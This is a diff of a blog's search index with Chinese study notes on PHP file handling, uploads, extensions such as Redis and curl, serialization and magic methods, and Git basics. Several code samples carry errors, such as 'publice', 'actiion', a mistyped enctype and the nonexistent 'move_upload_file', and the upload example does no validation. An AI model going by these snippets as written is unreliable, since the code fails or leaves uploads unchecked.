@@ -1,176 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>php文件相关操作</title>
-    <url>/2020/07/12/php_file_about/</url>
-    <content><![CDATA[<hr>
-<h2 id="php文件相关操作"><a href="#php文件相关操作" class="headerlink" title="php文件相关操作"></a>php文件相关操作</h2><ul>
-<li>文件操作</li>
-<li>文件包含<ul>
-<li>文件包含形式</li>
-<li>区别</li>
-<li>文件加载原理</li>
-<li>文件加载路径</li>
-<li>文件嵌套包含</li>
-</ul>
-</li>
-<li>文件上传<ul>
-<li>配置php.ini</li>
-<li>新建一个文件上传</li>
-</ul>
-</li>
-</ul>
-<h3 id="0X00-文件操作"><a href="#0X00-文件操作" class="headerlink" title="0X00 文件操作"></a>0X00 文件操作</h3><ul>
-<li>fopen() 的第一个参数包含被打开的文件名，第二个参数规定打开文件的模式。<ul>
-<li>$myfile = fopen(“webdictionary.txt”, “r”) or die(“Unable to open file!”);</li>
-</ul>
-</li>
-<li>读文件<ul>
-<li>Fgets($find) //读第一行文件<ul>
-<li>▲ 文件指针必须是有效的，必须指向由 fopen()或fsockopen()成功打开的文件(并还未由 fclose() 关闭)。</li>
-<li>▲ fget()可以被用来模拟get/post请求，结合fopen()和fsockopen()两个函数</li>
-</ul>
-</li>
-<li>Fread($find,获取字节) //指定获取内容</li>
-<li>Filesize($find) //获取文件字节<ul>
-<li>▲ $find 必须为路径</li>
-</ul>
-</li>
-<li>Fclose($find) //关闭资源</li>
-</ul>
-</li>
-<li>修改或添加文件内容<ul>
-<li>Fopen(./1.xx,”a+”);</li>
-<li>Fwrite(“文件”,”内容”);<ul>
-<li>▲ 只能将字符串string写进文件，无法将数组写进</li>
-<li>▲ 写进数组可借用file_put_contents()函数</li>
-</ul>
-</li>
-<li>Fclose(find);  //关闭资源</li>
-</ul>
-</li>
-<li>文件指针feof()<ul>
-<li>▲ 文件指针必须是有效的，必须指向由 fopen()或fsockopen()成功打开的文件（并还未由 fclose()关闭）</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //读文件</span><br><span class="line">    $f = fopen(&quot;./1.txt&quot;, &quot;a+&quot;);</span><br><span class="line"></span><br><span class="line">    echo Fgets($f);  //读第一行文件</span><br><span class="line">    echo Fgets($f);  //读第二行文件</span><br><span class="line">    echo Fread($f,2);  //获取文件前两个字符</span><br><span class="line"></span><br><span class="line">    echo Filesize($f);  //获取屋内按总的字符数</span><br><span class="line">    echo Fread($f,Filesize(&apos;./1.html&apos;));  //输出1.html中的所有内容</span><br><span class="line"></span><br><span class="line">    Fclose($f);  //关闭文件</span><br><span class="line">    echo Fread($f,2);  //无法读取到文件</span><br><span class="line"></span><br><span class="line">    //读写文件</span><br><span class="line">    $f = fopen(&quot;./1.txt&quot;, &quot;a+&quot;);</span><br><span class="line"></span><br><span class="line">    Fwrite($f,&apos;aaaaaa&apos;)  //在文件最后添加aaaaaa</span><br><span class="line">    Fclose($f);</span><br><span class="line"></span><br><span class="line">    $f = fopen(&quot;./1.txt&quot;, &quot;w&quot;);</span><br><span class="line"></span><br><span class="line">    Fwrite($f,&apos;aaaaaa&apos;)  //删除文件，并在文件开头添加aaaaaa</span><br><span class="line">    Fclose($f);</span><br><span class="line"></span><br><span class="line">    //路径拼接</span><br><span class="line"></span><br><span class="line">    $lujing = $_SERVER[&apos;DOCUMENT_ROOT&apos;].&quot;/&quot;;</span><br><span class="line"></span><br><span class="line">    $f = fopen($lujing.&quot;123.txt&quot;,&quot;a.txt&quot;);</span><br><span class="line"></span><br><span class="line">    Fwrite($f,&apos;aaaaaa\r\n&apos;);  //写入成功</span><br><span class="line"></span><br><span class="line">    //命令读取文件</span><br><span class="line"></span><br><span class="line">    echo `dir`;  //读取系统路径</span><br><span class="line"></span><br><span class="line">    echo `type d:\\1.txt`;  //读取1.txt文件中的内容</span><br><span class="line"></span><br><span class="line">    //文件指针</span><br><span class="line"></span><br><span class="line">    $f = fopen(&quot;./1.txt&quot;, &quot;r+&quot;);</span><br><span class="line">    while(!feof($f))</span><br><span class="line">    &#123;</span><br><span class="line">        $result.= fgets($f,128);</span><br><span class="line">    &#125;</span><br><span class="line">    echo $result;  //输出1.txt的所有内容</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="0X01-文件包含"><a href="#0X01-文件包含" class="headerlink" title="0X01 文件包含"></a>0X01 文件包含</h3><h5 id="文件包含形式"><a href="#文件包含形式" class="headerlink" title="文件包含形式"></a>文件包含形式</h5><ul>
-<li>四种文件包含形式<ul>
-<li>Include：包含文件</li>
-<li>Include_once：系统会自动判断文件包含过程中，是否已经包含过（一个文件最多被包含一次）</li>
-<li>Require：与include相同</li>
-<li>Require_once：以include_once相同</li>
-</ul>
-</li>
-<li>向上包含<ul>
-<li>先包含文件，后使用文件中的内容  </li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include1.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //被包含文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //定义数据</span><br><span class="line">    $a = 1;</span><br><span class="line">    define(&apos;PI&apos;,3.14);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include2.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //包含文件：使用数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //包含文件</span><br><span class="line">    include &apos;include1.php&apos;; //包含当前文件include2.php所在文件夹下的include1.php</span><br><span class="line"></span><br><span class="line">    echo $a,PI;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //再次加载</span><br><span class="line">    //include &apos;include1.php&apos;;</span><br><span class="line"></span><br><span class="line">    //include_once</span><br><span class="line">    //include_once &apos;include1.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>向下包含<ul>
-<li>先准备内容，然后包含另外的文件，在另外的文件中，使用当前的内容</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include3.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //定义数据</span><br><span class="line"></span><br><span class="line">    $a = 10;</span><br><span class="line">    const PI = 3.14;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //包含文件：为了显示以上数据</span><br><span class="line">    include_once &apos;include4.php&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include4.php</span><br><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;&lt;?php echo $a;?&gt;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;?php echo PI;?&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h5><ul>
-<li>Include和include_once<ul>
-<li>Include系统会碰到一次，执行一次；如果对统一个文件进行多次加载，那么系统会执行多次；</li>
-<li>Include_once：系统碰到多次，也只会执行一次。</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include2.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //包含文件：使用数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //包含文件</span><br><span class="line">    include &apos;include1.php&apos;; //包含当前文件include2.php所在文件夹下的include1.php</span><br><span class="line"></span><br><span class="line">    echo $a,PI;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //再次加载</span><br><span class="line">    //include &apos;include1.php&apos;;</span><br><span class="line"></span><br><span class="line">    //include_once</span><br><span class="line">    //include_once &apos;include1.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Require和include<ul>
-<li>本质都是包含文件，唯一的区别在于包含不到文件的时候，报错的形式不一样</li>
-<li>Include的错误级别比较轻：不会阻止代码执行</li>
-<li>Require要求较高：如果包含出错代码不再执行（require后面的代码）</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include5.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //require和include的区别</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //include包含文件</span><br><span class="line">    //include &apos;a.php&apos;;</span><br><span class="line"></span><br><span class="line">    //require包含文件</span><br><span class="line">    require &apos;a.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    echo &apos;hello world&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="文件加载原理"><a href="#文件加载原理" class="headerlink" title="文件加载原理"></a>文件加载原理</h5><ul>
-<li>PHP代码的执行流程<ul>
-<li>读取代码文件（PHP程序）</li>
-<li>编译：将PHP代码转换成字节码（生成opcode）</li>
-<li>zendengine来解析opcode，按照字节码去进行逻辑运算</li>
-<li>转换成对应的HTML代码</li>
-</ul>
-</li>
-<li>文件加载原理<ul>
-<li>在文件加载（include或者require）的时候，系统会自动的将被包含文件中的代码相当于嵌入到当前文件中</li>
-<li>加载位置：在哪加载，对应的文件中的代码嵌入的位置就是对应的include位置</li>
-<li>在PHP中被包含的文件是单独进行编译的</li>
-</ul>
-</li>
-<li>▲ PHP文件在编译的过程中如果出现了语法错误，那么会失败（不会执行）；但是如果被包含文件有错误的时候，系统会在执行到包含include这条语句的时候才会报错</li>
-</ul>
-<h5 id="文件加载路径"><a href="#文件加载路径" class="headerlink" title="文件加载路径"></a>文件加载路径</h5><ul>
-<li>文件在加载的时候需要指定文件路径才能保证PHP正确的找到对应的文件</li>
-<li>绝对路径：从磁盘的根目录开始（本地绝对路径）<ul>
-<li>Windows：盘符C:/路径/PHP文件</li>
-<li>Linux：/路径/PHP文件</li>
-</ul>
-</li>
-<li>相对路径：从当前文件所在目录开始的路径<ul>
-<li>.|./：表示当前文件夹</li>
-<li>../：上级目录（当前文件夹的上一层文件夹）</li>
-</ul>
-</li>
-<li>效率对比<ul>
-<li>绝对路径相对效率偏低，但是相对安全（路径不会出问题）</li>
-<li>相对路径相对效率高些，但是容易出错（相对路径会发生改变）</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //PHP文件加载路径</span><br><span class="line"></span><br><span class="line">    //相对路径加载</span><br><span class="line">    //include_once &apos;include1.php&apos;;  //默认当前文件本身</span><br><span class="line"></span><br><span class="line">    //include_once &apos;./include1.php&apos;;    </span><br><span class="line"></span><br><span class="line">    //复杂相对路径</span><br><span class="line">    //include_once &apos;../htdocs/include1.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //绝对路径</span><br><span class="line">    include_once &apos;D:/server/Apache24/htdocs/include1.php&apos;;</span><br><span class="line"></span><br><span class="line">    echo $a;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="文件嵌套包含"><a href="#文件嵌套包含" class="headerlink" title="文件嵌套包含"></a>文件嵌套包含</h5><ul>
-<li>一个文件包含另外一个文件，同时被包含的文件又包含了另外一个文件</li>
-</ul>
-<h3 id="0X02-文件上传"><a href="#0X02-文件上传" class="headerlink" title="0X02 文件上传"></a>0X02 文件上传</h3><ul>
-<li>表单的enctype属性规定在发送到服务器之前应该如何对表单数据进行编码<ul>
-<li>application/x-www-form-urlencoded -&gt; 在发送前编码所有字符（默认）</li>
-<li>multipart/form-data -&gt; 不对字符编码，在使用包含文件上传控件的表单时，必须使用该值</li>
-<li>text/plain  -&gt; 空格转为”+”加号，但不对特殊字符编码</li>
-</ul>
-</li>
-</ul>
-<h5 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h5><ul>
-<li>file_upload = on  //是否允许文件上传，默认开启，即允许上传文件</li>
-<li>upload_tmp_dir =   //文件上传到服务器后产生的临时文件路径，如果没有指定临时文件路径，那么使用系统的临时目录，一般会修改配置文件，指定临时目录</li>
-<li>upload_max_filesize = 2M  //允许上传的单个文件的最大值</li>
-<li>max_file_uploads = 20  //一次上传文件允许的最大数目</li>
-</ul>
-<h5 id="新建一个文件上传"><a href="#新建一个文件上传" class="headerlink" title="新建一个文件上传"></a>新建一个文件上传</h5><ul>
-<li>1.html</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form actiion=&quot;&quot; method=&quot;post&quot; enctype=&quot;,ultipart/form-data&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;p&gt;</span><br><span class="line">    上传:&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">    &lt;p&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>demo.php</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    var_dump($_FILES);  //输出一个二维数组</span><br><span class="line"></span><br><span class="line">    include_once &apos;./1.html&apos;;</span><br><span class="line"></span><br><span class="line">    //上传文件</span><br><span class="line"></span><br><span class="line">    $f = empty($_FILES)?&quot;&quot; : $_FILES[&quot;file2&quot;][&quot;tmp_name&quot;];</span><br><span class="line"></span><br><span class="line">    switch($_FILES[&quot;file2&quot;][&quot;error&quot;])</span><br><span class="line">    &#123;</span><br><span class="line">        case 0:</span><br><span class="line">        @move_upload_file($f,&quot;./111.jpg&quot;);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">        default:</span><br><span class="line">            # code...</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //变化</span><br><span class="line">    时间戳 -&gt; time().&quot;.jpg&quot;</span><br><span class="line">    后缀截取 -&gt; $filechar = $_FILES[&apos;file2&apos;][&apos;name&apos;] -&gt; 字符串处理</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-  </entry>
-  <entry>
     <title>php cookie</title>
     <url>/2020/07/12/php_cookie/</url>
     <content><![CDATA[<hr>
@@ -209,6 +39,138 @@
 </ul>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    session_start();</span><br><span class="line">    var_dump(session_id());</span><br><span class="line">    var_dump($_SESSION);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>php的扩展</title>
+    <url>/2020/07/12/php_extension/</url>
+    <content><![CDATA[<hr>
+<h2 id="php的扩展"><a href="#php的扩展" class="headerlink" title="php的扩展"></a>php的扩展</h2><ul>
+<li>CURL扩展</li>
+<li>openssl扩展</li>
+<li>Redis以及扩展<ul>
+<li>Redis For Winodow</li>
+<li>Redis For Linux</li>
+<li>Redis操作手册</li>
+</ul>
+</li>
+</ul>
+<h3 id="0X00-CURL扩展"><a href="#0X00-CURL扩展" class="headerlink" title="0X00 CURL扩展"></a>0X00 CURL扩展</h3><ul>
+<li>▲ 2020.03.15 网上看到了很多关于Window环境开启curl的方法，但都存在一定问题</li>
+<li>php开启扩展（php.ini）<ul>
+<li>extension=curl</li>
+</ul>
+</li>
+<li>▲ curl加载：找到对应php目录下libssh2.dll文件，复制到对应apache的bin文件夹下</li>
+<li>重启Apache，查看phpinfo，是否有Curl</li>
+<li>php_curl_test.php</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">     var_dump(curl_init());  //输出为 resource(2) of type (curl) </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/php/php_extension/curl_install.png" alt="CURL_install"></p>
+<h3 id="0x01-openssl扩展"><a href="#0x01-openssl扩展" class="headerlink" title="0x01 openssl扩展"></a>0x01 openssl扩展</h3><ul>
+<li>▲ 对于现在大多数网站来说，都是https模式，爬虫需要开启openssl扩展建立连接</li>
+<li>php开启扩展（php.ini文件）<ul>
+<li>extension=php_openssl</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/php/php_extension/openssl_install.png" alt="openssl_install"></p>
+<h3 id="0X02-Redis以及扩展"><a href="#0X02-Redis以及扩展" class="headerlink" title="0X02 Redis以及扩展"></a>0X02 Redis以及扩展</h3><h5 id="Redis-For-Winodow"><a href="#Redis-For-Winodow" class="headerlink" title="Redis For Winodow"></a>Redis For Winodow</h5><ul>
+<li>▲ 2020.03.15 Redis for Window官方已经停止维护</li>
+<li>▲ Redis默认端口为6379，默认密码为空密码</li>
+<li>Redis废弃函数替换：<a href="https://blog.csdn.net/xchenhao/article/details/97251618" target="_blank" rel="noopener">https://blog.csdn.net/xchenhao/article/details/97251618</a></li>
+<li>Redis -&gt; Github的维护仓库：<a href="https://github.com/microsoftarchive/redis/releases" target="_blank" rel="noopener">https://github.com/microsoftarchive/redis/releases</a></li>
+<li>Redis官方文档 -&gt; for window <a href="https://www.redis.com.cn/redis-installation" target="_blank" rel="noopener">https://www.redis.com.cn/redis-installation</a></li>
+<li>Redis扩展 -&gt; pecl的维护仓库：<a href="http://pecl.php.net/package/redis" target="_blank" rel="noopener">http://pecl.php.net/package/redis</a></li>
+<li>Pecl仓库下载 -&gt; <a href="https://windows.php.net/downloads/pecl/" target="_blank" rel="noopener">https://windows.php.net/downloads/pecl/</a></li>
+<li>下载Redis.msi安装文件，下载Redis扩展（对应PHP版本）</li>
+<li>拷贝redis的扩展php_redis.dll -&gt; php/ext</li>
+<li>php开启扩展（php.ini文件）<ul>
+<li>extension=php_redis.dll</li>
+</ul>
+</li>
+<li>重启Apache，查看phpinfo，是否有Redis</li>
+<li>window_php_redis_test.php</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">     $redis = new Redis();                   //redis对象</span><br><span class="line">     $redis-&gt;connect(&quot;127.0.0.1&quot;,&quot;6379&quot;); //连接redis服务器</span><br><span class="line">     $redis-&gt;set(&quot;test&quot;,&quot;Hello World&quot;);      //set字符串值</span><br><span class="line">     echo $redis-&gt;get(&quot;test&quot;);               //获取值</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/php/php_extension/redis_for_window.png" alt="redis_for_windows"></p>
+<h5 id="Redis-For-Linux"><a href="#Redis-For-Linux" class="headerlink" title="Redis For Linux"></a>Redis For Linux</h5><ul>
+<li>Redis安装：<a href="https://redis.io/" target="_blank" rel="noopener">https://redis.io/</a> （自安装灵活性较大）</li>
+<li>php的redis扩展：<a href="https://github.com/phpredis/phpredis/releases" target="_blank" rel="noopener">https://github.com/phpredis/phpredis/releases</a></li>
+<li>安装redis扩展</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar xzf phpredis-xxx.tar.gz</span><br><span class="line">cd phpredis </span><br><span class="line">sudo phpize </span><br><span class="line">sudo ./configure </span><br><span class="line">sudo make </span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将modules文件夹的内容复制并粘贴到PHP扩展目录中，并在php.ini中添加以下行<ul>
+<li><code>extension = redis.so</code> </li>
+</ul>
+</li>
+<li>linux_php_redis_test.php</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $redis = new Redis(); </span><br><span class="line">    $redis-&gt;connect(&apos;127.0.0.1&apos;, 6379); </span><br><span class="line">    echo &quot;Server is running: &quot;.$redis-&gt;ping();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/php/php_extension/redis_for_linux.png" alt="redis_for_linux"></p>
+<h5 id="Redis操作手册"><a href="#Redis操作手册" class="headerlink" title="Redis操作手册"></a>Redis操作手册</h5><ul>
+<li>phpredis：<a href="https://github.com/phpredis/phpredis" target="_blank" rel="noopener">https://github.com/phpredis/phpredis</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>php序列化</title>
+    <url>/2020/07/12/php_serialize_unserialize/</url>
+    <content><![CDATA[<hr>
+<h3 id="php序列化"><a href="#php序列化" class="headerlink" title="php序列化"></a>php序列化</h3><blockquote>
+<p>   ▲ 对象的序列化利于对象的保存和传输，也可以让多个文件共享对象</p>
+<p>   php序列化的函数为serialize，反序列化的函数为unserialize</p>
+</blockquote>
+<h5 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h5><ul>
+<li>php序列化是为了在程序运行的过程中对对象进行转储而产生的。序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保留函数方法</li>
+<li>例子<ul>
+<li>O代表是对象，表示改对象名称有4个字符，”Test”表示改对象的名称，3表示改对象里有3个成员</li>
+<li>变量的序列化<ul>
+<li>public属性序列化后为本身</li>
+<li>protected属性序列化后示方式是在变量名前加个%00*%00</li>
+<li>private属性序列化后示方式是在变量名前加个%00类名%00</li>
+</ul>
+</li>
+<li>括号里面的值根据分号来分开看，分号左边的是变量名，分号右边的是变量的值</li>
+<li>▲ 序列化不保存方法</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    class Test&#123;</span><br><span class="line">        public $a = &apos;This is A&apos;;</span><br><span class="line">        protected $b = &apos;This is B&apos;;</span><br><span class="line">        private $c = &apos;This is C&apos;;</span><br><span class="line">        publice function test1()&#123;</span><br><span class="line">            return &apos;this is test1&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $test = new Test();</span><br><span class="line">    $sTest = serialize($test);</span><br><span class="line">    var_dump($sTest);  </span><br><span class="line">    // 输出为string(96) &quot;O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;s:9:&quot;This is A&quot;;s:4:&quot;*b&quot;;s:9:&quot;This is B&quot;;s:7:&quot;Testc&quot;;s:9:&quot;This is C&quot;;&#125;&quot;</span><br><span class="line"></span><br><span class="line">    解释</span><br><span class="line">    O 代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示</span><br><span class="line">    4 代表类名字占三个字符 </span><br><span class="line">    Test 类名</span><br><span class="line">    3 代表三个属性</span><br><span class="line">    s 代表字符串</span><br><span class="line">    1 代表属性名长度</span><br><span class="line">    a 属性名</span><br><span class="line">    s:9:&quot;This is A&quot; 字符串 属性值长度 属性值</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><ul>
+<li>例子</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    class Test&#123;</span><br><span class="line">        public $a = &apos;This is A&apos;;</span><br><span class="line">        protected $b = &apos;This is B&apos;;</span><br><span class="line">        private $c = &apos;This is C&apos;;</span><br><span class="line">        publice function test1()&#123;</span><br><span class="line">            return &apos;this is test1&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $test = new Test();</span><br><span class="line">    $sTest = serialize($test);   </span><br><span class="line">    $uTest = unserialize($sTest);</span><br><span class="line">    var_dump($uTest);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //输出，还原成一个数组</span><br><span class="line">    object(Test)#2 (3) &#123;</span><br><span class="line">      [&quot;a&quot;]=&gt;</span><br><span class="line">      string(9) &quot;This is A&quot;</span><br><span class="line">      [&quot;b&quot;:protected]=&gt;</span><br><span class="line">      string(9) &quot;This is B&quot;</span><br><span class="line">      [&quot;c&quot;:&quot;Test&quot;:private]=&gt;</span><br><span class="line">      string(9) &quot;This is C&quot;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h5><ul>
+<li>官网地址：<a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.magic.php</a></li>
+<li>__construct()当一个对象创建时被调用</li>
+<li>__destruct()当一个对象销毁时被调用</li>
+<li>__toString()当一个对象被当作一个字符串使用<ul>
+<li>▲ __toString()则必须返回一个字符串</li>
+</ul>
+</li>
+<li>__sleep()在对象被序列化之前运行<ul>
+<li>▲ __sleep()期望能return一个数组</li>
+</ul>
+</li>
+<li>__wakeup()在对象被反序列化之后被调用</li>
+<li>__get()读取不可访问属性的值时被调用</li>
+<li>__invoke()当尝试以调用函数的方式调用一个对象时被调用</li>
+</ul>
 ]]></content>
       <categories>
         <category>PHP</category>
@@ -879,6 +841,738 @@
       </categories>
   </entry>
   <entry>
+    <title>Git基础</title>
+    <url>/2020/07/12/git_base/</url>
+    <content><![CDATA[<hr>
+<h2 id="Git基础"><a href="#Git基础" class="headerlink" title="Git基础"></a>Git基础</h2><ul>
+<li>什么是Git<ul>
+<li>Git中的数据库</li>
+</ul>
+</li>
+<li>Git的基本操作<ul>
+<li>安装Git</li>
+<li>Git的基本命令</li>
+<li>Git-tutorial Repository</li>
+</ul>
+</li>
+<li>Git的分支<ul>
+<li>Git分支操作</li>
+<li>Git-tutorial Repository</li>
+</ul>
+</li>
+<li>Git的合并<ul>
+<li>Git-tutorial Repository</li>
+</ul>
+</li>
+<li>Git的回滚撤销<ul>
+<li>Git-tutorial Repository</li>
+</ul>
+</li>
+<li>gitignore/fork同步<ul>
+<li>Git-tutorial Repository</li>
+</ul>
+</li>
+<li>Git的免密传送<ul>
+<li>Git传输的协议</li>
+<li>SSH协议登陆</li>
+</ul>
+</li>
+<li>Git的工作流</li>
+<li>常用工具</li>
+</ul>
+<h3 id="0X00-什么是Git"><a href="#0X00-什么是Git" class="headerlink" title="0X00 什么是Git"></a>0X00 什么是Git</h3><ul>
+<li>分布式版本管理系统<ul>
+<li>最初是为了管理Linux的系统内核</li>
+<li>同FTP相同的功能</li>
+<li>非线性管文件</li>
+<li>速度快</li>
+<li>对待数据更像一个快照流</li>
+<li>可以在无网络的情况下进行提交到本地服务器，在有网络的情况下提交给远端的服务器</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/git/1-Git-Server-and-Computer.PNG" alt="1-Git-Server and Computer"></p>
+<ul>
+<li>方式：直接记录快照而非方式，每次修改需要一次Commit</li>
+<li>保证完整性：计算校验和（哈希算法），Git存取的是哈希值</li>
+</ul>
+<p><img src="/images/git/1-Git--Snaphost.PNG" alt="1-Git--Snaphost"></p>
+<p><img src="/images/git/1-Git--%E5%AE%8C%E6%95%B4%E6%80%A7.PNG" alt="1-Git--完整性"></p>
+<h5 id="Git中的数据库"><a href="#Git中的数据库" class="headerlink" title="Git中的数据库"></a>Git中的数据库</h5><ul>
+<li>Git仓库–.git directory：保存项目数据，元数据的地方，git自己维护的文件夹</li>
+<li>工作目录–Working Directory：内容自Git仓库，对当前项目某一版本独立提取出来的内容</li>
+<li>暂存区–Staging Area：保存下次提交的文件目录，也算是一个索引</li>
+<li>三个概念<ul>
+<li>已提交：Git目录中保存着的特定版本文件</li>
+<li>已暂存：做了修改并放在暂存区</li>
+<li>已修改：做了修改但还没有放到暂存区</li>
+</ul>
+</li>
+<li>远程仓库–Remote：多人操作的仓库</li>
+</ul>
+<p><img src="/images/git/1-Git%E4%BB%93%E5%BA%93-1.PNG" alt="1-Git仓库-1"></p>
+<p><img src="/images/git/1-Git%E4%BB%93%E5%BA%93-2.PNG" alt="1-Git仓库-2"></p>
+<h3 id="0X01-Git的基本操作"><a href="#0X01-Git的基本操作" class="headerlink" title="0X01 Git的基本操作"></a>0X01 Git的基本操作</h3><h5 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h5><ul>
+<li>下载git OXS版本（一般为内置/brew install git安装）</li>
+<li>下载git WindowS版本（Git网页下载Git）</li>
+<li>下载git Linux版本（apt-get install git-all/yum -y install git）</li>
+</ul>
+<h5 id="Git的基本命令"><a href="#Git的基本命令" class="headerlink" title="Git的基本命令"></a>Git的基本命令</h5><ul>
+<li>▲ 提交到远程仓库需要在Github上创建一个仓库</li>
+<li>Git的版本<ul>
+<li><strong><code>🔺命令：git version</code></strong></li>
+</ul>
+</li>
+<li>Git的用户信息<ul>
